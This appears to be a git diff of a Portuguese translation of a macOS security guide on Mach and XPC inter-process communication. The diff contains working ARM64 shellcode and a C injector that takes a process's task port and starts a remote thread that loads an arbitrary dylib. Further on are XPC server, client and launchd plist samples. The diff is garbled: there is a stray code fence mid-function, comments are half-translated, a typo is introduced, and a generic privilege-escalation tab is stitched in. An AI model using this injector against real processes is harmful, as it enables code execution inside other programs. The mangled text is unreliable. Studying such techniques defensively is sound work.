+"\xff\x83\x00\xd1" // SUB SP, SP, #0x20         ; Allocate 32 bytes of space on the stack for local variables
+"\xFD\x7B\x01\xA9" // STP X29, X30, [SP, #0x10] ; Save frame pointer and link register on the stack
+"\xFD\x43\x00\x91" // ADD X29, SP, #0x10        ; Set frame pointer to current stack pointer
+"\xff\x43\x00\xd1" // SUB SP, SP, #0x10         ; Space for the
+"\xE0\x03\x00\x91" // MOV X0, SP                ; (arg0)Store in the stack the thread struct
+"\x01\x00\x80\xd2" // MOVZ X1, 0                ; X1 (arg1) = 0;
+"\xA2\x00\x00\x10" // ADR X2, 0x14              ; (arg2)12bytes from here, Address where the new thread should start
+"\x03\x00\x80\xd2" // MOVZ X3, 0                ; X3 (arg3) = 0;
+"\x68\x01\x00\x58" // LDR X8, #44               ; load address of PTHRDCRT (pthread_create_from_mach_thread)
+"\x00\x01\x3f\xd6" // BLR X8                    ; call pthread_create_from_mach_thread
+"\x00\x00\x00\x14" // loop: b loop              ; loop forever
 
-    // Call dlopen with the path to the library
-    "\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
-    "\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
-    "\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
-    "\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
-    "\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
-    
-    // Call pthread_exit
-    "\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
-    "\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
-    "\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
-    
-    "PTHRDCRT"  // <-
-    "PTHRDEXT"  // <-
-    "DLOPEN__"  // <- 
-    "LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB" 
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
-    "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;
+// Call dlopen with the path to the library
+"\xC0\x01\x00\x10"  // ADR X0, #56  ; X0 => "LIBLIBLIB...";
+"\x68\x01\x00\x58"  // LDR X8, #44 ; load DLOPEN
+"\x01\x00\x80\xd2"  // MOVZ X1, 0 ; X1 = 0;
+"\x29\x01\x00\x91"  // ADD   x9, x9, 0  - I left this as a nop
+"\x00\x01\x3f\xd6"  // BLR X8     ; do dlopen()
+
+// Call pthread_exit
+"\xA8\x00\x00\x58"  // LDR X8, #20 ; load PTHREADEXT
+"\x00\x00\x80\xd2"  // MOVZ X0, 0 ; X1 = 0;
+"\x00\x01\x3f\xd6"  // BLR X8     ; do pthread_exit
+
+"PTHRDCRT"  // <-
+"PTHRDEXT"  // <-
+"DLOPEN__"  // <-
+"LIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIBLIB"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00"
+"\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" "\x00" ;
 
 
 
 
 int inject(pid_t pid, const char *lib) {
 
-    task_t remoteTask;
-    struct stat buf;
+task_t remoteTask;
+struct stat buf;
 
-    // Check if the library exists
-    int rc = stat (lib, &buf);
+// Check if the library exists
+int rc = stat (lib, &buf);
 
-    if (rc != 0)
-    {
-        fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
-        //return (-9);
-    }
+if (rc != 0)
+{
+fprintf (stderr, "Unable to open library file %s (%s) - Cannot inject\n", lib,strerror (errno));
+//return (-9);
+}
 
-    // Get access to the task port of the process we want to inject into
-    kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
-    if (kr != KERN_SUCCESS) {
-        fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
-        return (-1);
-    }
-    else{
-        printf("Gathered privileges over the task port of process: %d\n", pid);
-    }
+// Get access to the task port of the process we want to inject into
+kern_return_t kr = task_for_pid(mach_task_self(), pid, &remoteTask);
+if (kr != KERN_SUCCESS) {
+fprintf (stderr, "Unable to call task_for_pid on pid %d: %d. Cannot continue!\n",pid, kr);
+return (-1);
+}
+else{
+printf("Gathered privileges over the task port of process: %d\n", pid);
+}
 
-    // Allocate memory for the stack
-    mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
-    mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
-    kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
-    
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
-        return (-2);
-    }
-    else
-    {
+// Allocate memory for the stack
+mach_vm_address_t remoteStack64 = (vm_address_t) NULL;
+mach_vm_address_t remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate(remoteTask, &remoteStack64, STACK_SIZE, VM_FLAGS_ANYWHERE);
 
-        fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
-    }
-    
-    // Allocate memory for the code
-    remoteCode64 = (vm_address_t) NULL;
-    kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote stack in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
+else
+{
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
-        return (-2);
-    }
+fprintf (stderr, "Allocated remote stack @0x%llx\n", remoteStack64);
+}
 
- 
-    // Patch shellcode
+// Allocate memory for the code
+remoteCode64 = (vm_address_t) NULL;
+kr = mach_vm_allocate( remoteTask, &remoteCode64, CODE_SIZE, VM_FLAGS_ANYWHERE );
 
-    int i = 0;
-    char *possiblePatchLocation = (injectedCode );
-    for (i = 0 ; i < 0x100; i++)
-    {
-
-        // Patching is crude, but works.
-        //
-        extern void *_pthread_set_self;
-        possiblePatchLocation++;
-
-        
-        uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
-        uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
-        uint64_t addrOfDlopen = (uint64_t) dlopen;
-
-        if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
-        {
-            memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
-            printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
-        }
-
-        if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
-        {
-            memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
-            printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
-        }
-
-        if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
-        {
-            printf ("DLOpen @%llx\n", addrOfDlopen);
-            memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
-        }
-
-        if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
-        {
-            strcpy(possiblePatchLocation, lib );
-        }
-    }
-
-	// Write the shellcode to the allocated memory
-    kr = mach_vm_write(remoteTask,                   // Task port
-	                   remoteCode64,                 // Virtual Address (Destination)
-	                   (vm_address_t) injectedCode,  // Source
-	                    0xa9);                       // Length of the source
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Unable to allocate memory for remote code in thread: Error %s\n", mach_error_string(kr));
+return (-2);
+}
 
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to write remote thread memory: Error %s\n", mach_error_string(kr));
-        return (-3);
-    }
+// Patch shellcode
+
+int i = 0;
+char *possiblePatchLocation = (injectedCode );
+for (i = 0 ; i < 0x100; i++)
+{
+
+// Patching is crude, but works.
+//
+extern void *_pthread_set_self;
+possiblePatchLocation++;
 
 
-    // Set the permissions on the allocated code memory
-    kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
+uint64_t addrOfPthreadCreate = dlsym ( RTLD_DEFAULT, "pthread_create_from_mach_thread"); //(uint64_t) pthread_create_from_mach_thread;
+uint64_t addrOfPthreadExit = dlsym (RTLD_DEFAULT, "pthread_exit"); //(uint64_t) pthread_exit;
+uint64_t addrOfDlopen = (uint64_t) dlopen;
 
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to set memory permissions for remote thread's code: Error %s\n", mach_error_string(kr));
-        return (-4);
-    }
+if (memcmp (possiblePatchLocation, "PTHRDEXT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &addrOfPthreadExit,8);
+printf ("Pthread exit  @%llx, %llx\n", addrOfPthreadExit, pthread_exit);
+}
+```c
+if (memcmp (possiblePatchLocation, "PTHRDCRT", 8) == 0)
+{
+memcpy(possiblePatchLocation, &addrOfPthreadCreate,8);
+printf ("Pthread create from mach thread @%llx\n", addrOfPthreadCreate);
+}
 
-    // Set the permissions on the allocated stack memory
-    kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
-	
-    if (kr != KERN_SUCCESS)
-    {
-        fprintf(stderr,"Unable to set memory permissions for remote thread's stack: Error %s\n", mach_error_string(kr));
-        return (-4);
-    }
+if (memcmp(possiblePatchLocation, "DLOPEN__", 6) == 0)
+{
+printf ("DLOpen @%llx\n", addrOfDlopen);
+memcpy(possiblePatchLocation, &addrOfDlopen, sizeof(uint64_t));
+}
+
+if (memcmp(possiblePatchLocation, "LIBLIBLIB", 9) == 0)
+{
+strcpy(possiblePatchLocation, lib );
+}
+}
+
+// Escreva o shellcode na memória alocada
+kr = mach_vm_write(remoteTask,                   // Porta da tarefa
+remoteCode64,                 // Endereço virtual (destino)
+(vm_address_t) injectedCode,  // Fonte
+0xa9);                       // Comprimento da fonte
 
 
-    // Create thread to run shellcode
-    struct arm_unified_thread_state remoteThreadState64;
-    thread_act_t         remoteThread;
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Não foi possível escrever na memória da thread remota: Erro %s\n", mach_error_string(kr));
+return (-3);
+}
 
-    memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
 
-    remoteStack64 += (STACK_SIZE / 2); // this is the real stack
-        //remoteStack64 -= 8;  // need alignment of 16
+// Defina as permissões na memória de código alocada
+kr  = vm_protect(remoteTask, remoteCode64, 0x70, FALSE, VM_PROT_READ | VM_PROT_EXECUTE);
 
-    const char* p = (const char*) remoteCode64;
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Não foi possível definir as permissões de memória para o código da thread remota: Erro %s\n", mach_error_string(kr));
+return (-4);
+}
 
-    remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
-    remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
-    remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
-    remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+// Defina as permissões na memória de pilha alocada
+kr  = vm_protect(remoteTask, remoteStack64, STACK_SIZE, TRUE, VM_PROT_READ | VM_PROT_WRITE);
 
-    printf ("Remote Stack 64  0x%llx, Remote code is %p\n", remoteStack64, p );
+if (kr != KERN_SUCCESS)
+{
+fprintf(stderr,"Não foi possível definir as permissões de memória para a pilha da thread remota: Erro %s\n", mach_error_string(kr));
+return (-4);
+}
 
-    kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
-    (thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
 
-    if (kr != KERN_SUCCESS) {
-        fprintf(stderr,"Unable to create remote thread: error %s", mach_error_string (kr));
-        return (-3);
-    }
+// Crie a thread para executar o shellcode
+struct arm_unified_thread_state remoteThreadState64;
+thread_act_t         remoteThread;
 
-    return (0);
+memset(&remoteThreadState64, '\0', sizeof(remoteThreadState64) );
+
+remoteStack64 += (STACK_SIZE / 2); // esta é a pilha real
+//remoteStack64 -= 8;  // precisa de alinhamento de 16
+
+const char* p = (const char*) remoteCode64;
+
+remoteThreadState64.ash.flavor = ARM_THREAD_STATE64;
+remoteThreadState64.ash.count = ARM_THREAD_STATE64_COUNT;
+remoteThreadState64.ts_64.__pc = (u_int64_t) remoteCode64;
+remoteThreadState64.ts_64.__sp = (u_int64_t) remoteStack64;
+
+printf ("Pilha remota 64  0x%llx, Código remoto é %p\n", remoteStack64, p );
+
+kr = thread_create_running(remoteTask, ARM_THREAD_STATE64, // ARM_THREAD_STATE64,
+(thread_state_t) &remoteThreadState64.ts_64, ARM_THREAD_STATE64_COUNT , &remoteThread );
+
+if (kr != KERN_SUCCESS) {
+fprintf(stderr,"Não foi possível criar a thread remota: erro %s", mach_error_string (kr));
+return (-3);
+}
+
+return (0);
 }
 
 
 
 int main(int argc, const char * argv[])
 {
-    if (argc < 3)
-	{
-		fprintf (stderr, "Usage: %s _pid_ _action_\n", argv[0]);
-		fprintf (stderr, "   _action_: path to a dylib on disk\n");
-		exit(0);
-	}
+if (argc < 3)
+{
+fprintf (stderr, "Uso: %s _pid_ _ação_\n", argv[0]);
+fprintf (stderr, "   _ação_: caminho para um dylib no disco\n");
+exit(0);
+}
 
-    pid_t pid = atoi(argv[1]);
-    const char *action = argv[2];
-    struct stat buf;
+pid_t pid = atoi(argv[1]);
+const char *action = argv[2];
+struct stat buf;
 
-    int rc = stat (action, &buf);
-    if (rc == 0) inject(pid,action);
-    else
-    {
-        fprintf(stderr,"Dylib not found\n");
-    }
+int rc = stat (action, &buf);
+if (rc == 0) inject(pid,action);
+else
+{
+fprintf(stderr,"Dylib não encontrado\n");
+}
 
 }
 ```
@@ -692,9 +735,9 @@ gcc -framework Foundation -framework Appkit dylib_injector.m -o dylib_injector
 
 ### Informações básicas
 
-XPC, que significa Comunicação Interprocessual XNU (o kernel usado pelo macOS), é um framework para **comunicação entre processos** no macOS e iOS. O XPC fornece um mecanismo para fazer **chamadas de método assíncronas seguras entre diferentes processos** no sistema. É uma parte do paradigma de segurança da Apple, permitindo a **criação de aplicativos com privilégios separados** onde cada **componente** é executado com **apenas as permissões necessárias** para fazer seu trabalho, limitando assim o potencial de danos de um processo comprometido.
+XPC, que significa Comunicação Interprocessos XNU (o kernel usado pelo macOS), é um framework para **comunicação entre processos** no macOS e iOS. O XPC fornece um mecanismo para fazer **chamadas de método assíncronas seguras entre diferentes processos** no sistema. É uma parte do paradigma de segurança da Apple, permitindo a **criação de aplicativos com privilégios separados** onde cada **componente** é executado com **apenas as permissões necessárias** para fazer seu trabalho, limitando assim o potencial de danos de um processo comprometido.
 
-O XPC usa uma forma de Comunicação Interprocessual (IPC), que é um conjunto de métodos para diferentes programas em execução no mesmo sistema para enviar dados de ida e volta.
+O XPC usa uma forma de Comunicação Interprocessos (IPC), que é um conjunto de métodos para diferentes programas em execução no mesmo sistema para enviar dados de ida e volta.
 
 Os principais benefícios do XPC incluem:
 
@@ -716,7 +759,7 @@ Os serviços XPC são **iniciados** pelo **launchd** quando necessário e **ence
 
 ### Serviços XPC em todo o sistema
 
-Os **serviços XPC em todo o sistema** são acessíveis a todos os usuários. Esses serviços, seja launchd ou do tipo Mach, precisam ser **definidos em arquivos plist** localizados em diretórios especificados, como **`/System/Library/LaunchDaemons`**, **`/Library/LaunchDaemons`**, **`/System/Library/LaunchAgents`** ou **`/Library/LaunchAgents`**.
+Os **serviços XPC em todo o sistema** são acessíveis a todos os usuários. Esses serviços, sejam do tipo launchd ou Mach, precisam ser **definidos em arquivos plist** localizados em diretórios especificados, como **`/System/Library/LaunchDaemons`**, **`/Library/LaunchDaemons`**, **`/System/Library/LaunchAgents`** ou **`/Library/LaunchAgents`**.
 
 Esses arquivos plist terão uma chave chamada **`MachServices`** com o nome do serviço e uma chave chamada **`Program`** com o caminho para o binário:
 ```xml
@@ -726,33 +769,33 @@ cat /Library/LaunchDaemons/com.jamf.management.daemon.plist
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
 <plist version="1.0">
 <dict>
-	<key>Program</key>
-	<string>/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon</string>
-	<key>AbandonProcessGroup</key>
-	<true/>
-	<key>KeepAlive</key>
-	<true/>
-	<key>Label</key>
-	<string>com.jamf.management.daemon</string>
-	<key>MachServices</key>
-	<dict>
-		<key>com.jamf.management.daemon.aad</key>
-		<true/>
-		<key>com.jamf.management.daemon.agent</key>
-		<true/>
-		<key>com.jamf.management.daemon.binary</key>
-		<true/>
-		<key>com.jamf.management.daemon.selfservice</key>
-		<true/>
-		<key>com.jamf.management.daemon.service</key>
-		<true/>
-	</dict>
-	<key>RunAtLoad</key>
-	<true/>
+<key>Program</key>
+<string>/Library/Application Support/JAMF/Jamf.app/Contents/MacOS/JamfDaemon.app/Contents/MacOS/JamfDaemon</string>
+<key>AbandonProcessGroup</key>
+<true/>
+<key>KeepAlive</key>
+<true/>
+<key>Label</key>
+<string>com.jamf.management.daemon</string>
+<key>MachServices</key>
+<dict>
+<key>com.jamf.management.daemon.aad</key>
+<true/>
+<key>com.jamf.management.daemon.agent</key>
+<true/>
+<key>com.jamf.management.daemon.binary</key>
+<true/>
+<key>com.jamf.management.daemon.selfservice</key>
+<true/>
+<key>com.jamf.management.daemon.service</key>
+<true/>
+</dict>
+<key>RunAtLoad</key>
+<true/>
 </dict>
 </plist>
 ```
-Os que estão em **`LaunchDaemons`** são executados pelo root. Portanto, se um processo não privilegiado puder se comunicar com um desses, ele poderá ser capaz de escalar privilégios.
+Os que estão em **`LaunchDameons`** são executados pelo root. Portanto, se um processo não privilegiado puder se comunicar com um deles, poderá ser capaz de escalar privilégios.
 
 ### Mensagens de Evento XPC
 
@@ -768,7 +811,7 @@ Quando um processo tenta chamar um método via uma conexão XPC, o **serviço XP
 
 ### Autorização XPC
 
-A Apple também permite que os aplicativos **configurem alguns direitos e como obtê-los** para que, se o processo de chamada os tiver, ele possa ser **autorizado a chamar um método** do serviço XPC:
+A Apple também permite que os aplicativos **configurem alguns direitos e como obtê-los** para que, se o processo de chamada os tiver, ele possa **chamar um método** do serviço XPC:
 
 {% content-ref url="macos-xpc-authorization.md" %}
 [macos-xpc-authorization.md](macos-xpc-authorization.md)
@@ -784,51 +827,51 @@ A Apple também permite que os aplicativos **configurem alguns direitos e como o
 #include <xpc/xpc.h>
 
 static void handle_event(xpc_object_t event) {
-    if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
-        // Print received message
-        const char* received_message = xpc_dictionary_get_string(event, "message");
-        printf("Received message: %s\n", received_message);
+if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
+// Print received message
+const char* received_message = xpc_dictionary_get_string(event, "message");
+printf("Received message: %s\n", received_message);
 
-        // Create a response dictionary
-        xpc_object_t response = xpc_dictionary_create(NULL, NULL, 0);
-        xpc_dictionary_set_string(response, "received", "received");
+// Create a response dictionary
+xpc_object_t response = xpc_dictionary_create(NULL, NULL, 0);
+xpc_dictionary_set_string(response, "received", "received");
 
-        // Send response
-        xpc_connection_t remote = xpc_dictionary_get_remote_connection(event);
-        xpc_connection_send_message(remote, response);
+// Send response
+xpc_connection_t remote = xpc_dictionary_get_remote_connection(event);
+xpc_connection_send_message(remote, response);
 
-        // Clean up
-        xpc_release(response);
-    }
+// Clean up
+xpc_release(response);
+}
 }
 
 static void handle_connection(xpc_connection_t connection) {
-    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
-        handle_event(event);
-    });
-    xpc_connection_resume(connection);
+xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
+handle_event(event);
+});
+xpc_connection_resume(connection);
 }
 
 int main(int argc, const char *argv[]) {
-    xpc_connection_t service = xpc_connection_create_mach_service("xyz.hacktricks.service",
-                                                                   dispatch_get_main_queue(),
-                                                                   XPC_CONNECTION_MACH_SERVICE_LISTENER);
-    if (!service) {
-        fprintf(stderr, "Failed to create service.\n");
-        exit(EXIT_FAILURE);
-    }
+xpc_connection_t service = xpc_connection_create_mach_service("xyz.hacktricks.service",
+dispatch_get_main_queue(),
+XPC_CONNECTION_MACH_SERVICE_LISTENER);
+if (!service) {
+fprintf(stderr, "Failed to create service.\n");
+exit(EXIT_FAILURE);
+}
 
-    xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
-        xpc_type_t type = xpc_get_type(event);
-        if (type == XPC_TYPE_CONNECTION) {
-            handle_connection(event);
-        }
-    });
+xpc_connection_set_event_handler(service, ^(xpc_object_t event) {
+xpc_type_t type = xpc_get_type(event);
+if (type == XPC_TYPE_CONNECTION) {
+handle_connection(event);
+}
+});
 
-    xpc_connection_resume(service);
-    dispatch_main();
+xpc_connection_resume(service);
+dispatch_main();
 
-    return 0;
+return 0;
 }
 ```
 {% endtab %}
@@ -840,33 +883,39 @@ int main(int argc, const char *argv[]) {
 #include <xpc/xpc.h>
 
 int main(int argc, const char *argv[]) {
-    xpc_connection_t connection = xpc_connection_create_mach_service("xyz.hacktricks.service", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
+xpc_connection_t connection = xpc_connection_create_mach_service("xyz.hacktricks.service", NULL, XPC_CONNECTION_MACH_SERVICE_PRIVILEGED);
 
-    xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
-        if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
-            // Print received message
-            const char* received_message = xpc_dictionary_get_string(event, "received");
-            printf("Received message: %s\n", received_message);
-        }
-    });
+xpc_connection_set_event_handler(connection, ^(xpc_object_t event) {
+if (xpc_get_type(event) == XPC_TYPE_DICTIONARY) {
+// Print received message
+const char* received_message = xpc_dictionary_get_string(event, "received");
+printf("Received message: %s\n", received_message);
+}
+});
 
-    xpc_connection_resume(connection);
+xpc_connection_resume(connection);
 
-    xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
-    xpc_dictionary_set_string(message, "message", "Hello, Server!");
+xpc_object_t message = xpc_dictionary_create(NULL, NULL, 0);
+xpc_dictionary_set_string(message, "message", "Hello, Server!");
 
-    xpc_connection_send_message(connection, message);
+xpc_connection_send_message(connection, message);
 
-    dispatch_main();
-    
-    return 0;
+dispatch_main();
+
+return 0;
 }
 ```
 {% endtab %}
 
 {% tab title="xyz.hacktricks.service.plist" %}
 
-Este arquivo é um arquivo de propriedades do Launchd que define um serviço que será executado em segundo plano. O nome do arquivo deve ser o mesmo que o nome do serviço. O arquivo contém informações sobre o serviço, como o caminho do executável, argumentos, diretório de trabalho, variáveis de ambiente, etc. O Launchd é responsável por iniciar e gerenciar serviços em segundo plano no macOS.
+Este arquivo é um arquivo de propriedades do Launchd que define um serviço personalizado que será executado no sistema. O Launchd é o sistema de inicialização e gerenciamento de processos do macOS. Ele é responsável por iniciar, parar e monitorar processos e serviços em segundo plano.
+
+O arquivo plist contém informações sobre o serviço, como o caminho do executável, os argumentos a serem passados para o executável, o usuário e o grupo que executarão o serviço e outras opções de configuração.
+
+Para instalar o serviço, basta colocar o arquivo plist na pasta /Library/LaunchDaemons ou ~/Library/LaunchAgents e executar o comando launchctl load /path/to/plist. O serviço será iniciado automaticamente na próxima vez que o sistema for iniciado.
+
+Para desinstalar o serviço, basta executar o comando launchctl unload /path/to/plist e remover o arquivo plist da pasta LaunchDaemons ou LaunchAgents.
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"> <plist version="1.0">
@@ -874,19 +923,47 @@ Este arquivo é um arquivo de propriedades do Launchd que define um serviço que
 <key>Label</key>
 <string>xyz.hacktricks.service</string>
 <key>MachServices</key>
-    <dict>
-        <key>xyz.hacktricks.service</key>
-        <true/>
-    </dict>
+<dict>
+<key>xyz.hacktricks.service</key>
+<true/>
+</dict>
 <key>Program</key>
-    <string>/tmp/xpc_server</string>
-    <key>ProgramArguments</key>
-    <array>
-        <string>/tmp/xpc_server</string>
-    </array>
+<string>/tmp/xpc_server</string>
+<key>ProgramArguments</key>
+<array>
+<string>/tmp/xpc_server</string>
+</array>
 </dict>
 </plist>
 ```
+{% endtab %}
+{% endtabs %} 
+
+{% tabs %}
+{% tab title="Introdução" %}
+O macOS é um sistema operacional baseado em Unix que é amplamente utilizado em computadores pessoais da Apple. O macOS é conhecido por sua segurança e privacidade robustas, mas ainda é vulnerável a ataques devido a vulnerabilidades de segurança e configurações incorretas. Neste guia, exploraremos a arquitetura do macOS e como ela lida com a comunicação entre processos. Também discutiremos técnicas de escalonamento de privilégios que podem ser usadas para obter acesso não autorizado a recursos protegidos do sistema. 
+{% endtab %}
+
+{% tab title="Comunicação entre processos" %}
+O macOS usa vários mecanismos de comunicação entre processos (IPC) para permitir que os processos se comuniquem uns com os outros. Esses mecanismos incluem:
+
+- **Mach IPC**: um mecanismo de IPC de baixo nível usado pelo kernel do macOS e pelos processos do usuário.
+- **XPC**: um mecanismo de IPC de alto nível usado para comunicação entre processos do usuário.
+- **Distributed Objects**: um mecanismo de IPC de alto nível usado para comunicação entre processos do usuário.
+
+Esses mecanismos de IPC são usados para uma variedade de finalidades, incluindo comunicação entre processos do sistema, comunicação entre processos do usuário e comunicação entre processos do sistema e do usuário. 
+
+Os mecanismos de IPC do macOS são projetados para serem seguros e proteger a privacidade do usuário. No entanto, eles ainda são vulneráveis a ataques devido a vulnerabilidades de segurança e configurações incorretas. 
+{% endtab %}
+
+{% tab title="Escalonamento de privilégios" %}
+O escalonamento de privilégios é uma técnica usada para obter acesso não autorizado a recursos protegidos do sistema. No macOS, existem várias técnicas de escalonamento de privilégios que podem ser usadas para obter acesso não autorizado a recursos protegidos do sistema. Essas técnicas incluem:
+
+- **Exploração de vulnerabilidades**: a exploração de vulnerabilidades em aplicativos ou no próprio sistema operacional pode permitir que um invasor obtenha acesso não autorizado a recursos protegidos do sistema.
+- **Injeção de código**: a injeção de código em um processo do sistema pode permitir que um invasor execute código com privilégios elevados.
+- **Engenharia social**: a engenharia social pode ser usada para obter acesso não autorizado a recursos protegidos do sistema, como senhas ou informações confidenciais.
+
+Para proteger o sistema contra escalonamento de privilégios, é importante manter o sistema atualizado com as últimas atualizações de segurança e seguir as melhores práticas de segurança, como limitar o acesso de usuários privilegiados e restringir o acesso a recursos protegidos do sistema. 
 {% endtab %}
 {% endtabs %}
 ```bash
@@ -926,9 +1003,9 @@ sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
 
 @implementation MyXPCObject
 - (void)sayHello:(NSString *)some_string withReply:(void (^)(NSString *))reply {
-    NSLog(@"Received message: %@", some_string);
-    NSString *response = @"Received";
-    reply(response);
+NSLog(@"Received message: %@", some_string);
+NSString *response = @"Received";
+reply(response);
 }
 @end
 
@@ -939,122 +1016,65 @@ sudo rm /Library/LaunchDaemons/xyz.hacktricks.service.plist /tmp/xpc_server
 @implementation MyDelegate
 
 - (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection {
-    newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
+newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(MyXPCProtocol)];
 
-    MyXPCObject *my_object = [MyXPCObject new];
+MyXPCObject *my_object = [MyXPCObject new];
 
-    newConnection.exportedObject = my_object;
+newConnection.exportedObject = my_object;
 
-    [newConnection resume];
-    return YES;
+[newConnection resume];
+return YES;
 }
 @end
 
 int main(void) {
 
-    NSXPCListener *listener = [[NSXPCListener alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc"];
+NSXPCListener *listener = [[NSXPCListener alloc] initWithMachServiceName:@"xyz.hacktricks.svcoc"];
 
-    id <NSXPCListenerDelegate> delegate = [MyDelegate new];
-    listener.delegate = delegate;
-    [listener resume];
+id <NSXPCListenerDelegate> delegate = [MyDelegate new];
+listener.delegate = delegate;
+[listener resume];
 
-    sleep(10); // Fake something is done and then it ends
+sleep(10); // Fake something is done and then it ends
 }
 ```
 {% endtab %}
 
 {% tab title="oc_xpc_server.m" %}
 
-# Comunicação entre processos com XPC
+# Servidor XPC
 
-O XPC é um mecanismo de comunicação entre processos que permite que um processo execute código em outro processo. Isso é útil para dividir tarefas em diferentes processos e para garantir que um processo não possa acessar diretamente a memória de outro processo.
